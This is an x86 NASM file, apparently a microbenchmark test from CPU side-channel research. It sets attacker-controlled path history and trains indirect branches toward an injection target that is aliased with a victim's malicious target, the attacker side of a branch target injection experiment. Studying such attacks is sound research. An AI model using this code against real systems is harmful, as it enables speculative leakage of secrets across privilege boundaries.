%include "./SET_ATTACKER_PHR0.nasm"
%include "./SET_ATTACKER_PHR1.nasm"
%include "./SET_ATTACKER_DUMMY_PHR.nasm"

%define nthreads 1
%define repeat0  10
%define repeat1  1000
%define repeat2  1
%define noptype  2

%macro testinitc 0  ; initialization
    mov dword[PrintCustomPMC], 0
%endmacro

%macro testcode 0   ; main test
    rdrand rdx
    and rdx, 1
    mov qword[UserData], rdx 
    mfence
    call attacker_ibranch_0
    SERIALIZE
    call attacker_ibranch_1

    SERIALIZE

    xor qword[UserData], 1 
    mfence
    call attacker_ibranch_0
    SERIALIZE
    call attacker_ibranch_1

    %rep 512
     nop
    %endrep
%endmacro

%macro SHIFT_PHR 2  ; the macro code to left-shift the phr
    mov rax, %1
    jmp shift_phr%+ %2
    align 1<<16
    %rep (1<<16)-64
     nop
    %endrep
    shift_phr%+ %2:
    %rep 64-8
     nop
    %endrep
    dec rax
    cmp rax, 0
    jg shift_phr%+ %2
%endmacro

SECTION .sec_attacker_ibranch_0 exec
attacker_ibranch_0:
    mov rdx, qword[UserData]
    lea r10, [dummy_t]
    lea r9, [inject_t]
    cmp rdx, 1
    cmovz r10, r9
    mfence

    ; set IBP index
    cmp rdx, 1
    je attacker_set_PHR_start_0
    SHIFT_PHR 195,0
    %rep 23
     nop
    %endrep
    SET_ATTACKER_DUMMY_PHR 0

attacker_set_PHR_start_0:
    SHIFT_PHR 195,1
    %rep 23
     nop
    %endrep
    SET_ATTACKER_PHR0 0
attacker_set_PHR_end_0:

    align 1<<5 ; map to a different BTB set
    %rep (pc_15_to_6_0<<6)
     nop
    %endrep
    jmp r10
    %rep 32
     nop
    %endrep

SECTION .sec_attacker_ibranch_1 exec
attacker_ibranch_1:
    mov rdx, qword[UserData]
    lea r10, [dummy_t]
    lea r9, [inject_t]
    cmp rdx, 1
    cmovz r10, r9
    mfence

    ; set IBP index
    cmp rdx, 1
    je attacker_set_PHR_start_1
    SHIFT_PHR 195,2
    %rep 23
     nop
    %endrep
    SET_ATTACKER_DUMMY_PHR 1

attacker_set_PHR_start_1:
    SHIFT_PHR 195,3
    %rep 23
     nop
    %endrep
    SET_ATTACKER_PHR1 1
attacker_set_PHR_end_1:

    align 1<<5 ; map to a different BTB set
    %rep (pc_15_to_6_1<<6)
     nop
    %endrep
    jmp r10
    %rep 32
     nop
    %endrep


SECTION .sec_inject_target exec
dummy_t:
    %rep 32
     nop
    %endrep
    ret
inject_t: ; aliased with the malicious target in victim in virtual address
    %rep 64
     nop
    %endrep
    ret